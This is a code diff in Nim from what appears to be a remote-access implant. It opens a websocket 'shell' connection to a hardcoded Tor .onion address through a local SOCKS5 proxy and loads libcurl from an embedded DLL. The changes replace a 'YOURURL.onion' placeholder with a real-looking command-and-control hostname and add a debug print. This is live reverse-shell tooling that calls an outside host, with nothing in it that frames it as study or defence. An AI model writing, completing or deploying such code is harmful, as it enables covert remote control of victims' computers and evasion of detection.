@@ -21,6 +21,8 @@ import std/osproc
 import std/nativesockets
 import functions
 import std/json
+const
+  onion_hostname = "ws://vaba53nf5c7lh5qwwezt4bdbkeepudeuvcilpmj635rldedwlrydv2qd.onion"
 
 let libname = staticReadDll("libcurl.dll")
 
@@ -600,7 +602,7 @@ proc websocket_register(curl_client: PCurl): int =
 
 proc websocket_request_init*(): int =
   var cli = easy_init()
-  discard cli.easy_setopt(OPT_URL, "ws://YOURURL.onion/shell")
+  discard cli.easy_setopt(OPT_URL, onion_hostname&"/shell")
   discard cli.easy_setopt(OPT_CONNECT_ONLY, 2)
   discard cli.easy_setopt(OPT_PROXY, "socks5h://localhost:9050")
   let res = cli.easy_perform()
@@ -612,10 +614,11 @@ proc websocket_request_init*(): int =
 
 proc websocket_request_init_shell*(): int =
   var cli = easy_init()
-  discard cli.easy_setopt(OPT_URL, "ws://YOURURL.onion/shell")
+  discard cli.easy_setopt(OPT_URL, onion_hostname&"/shell")
   discard cli.easy_setopt(OPT_CONNECT_ONLY, 2)
   discard cli.easy_setopt(OPT_PROXY, "socks5h://localhost:9050")
   let res = cli.easy_perform()
+  echo res
   if res != E_OK:
     echo("Une erreur est apparue")
   else:
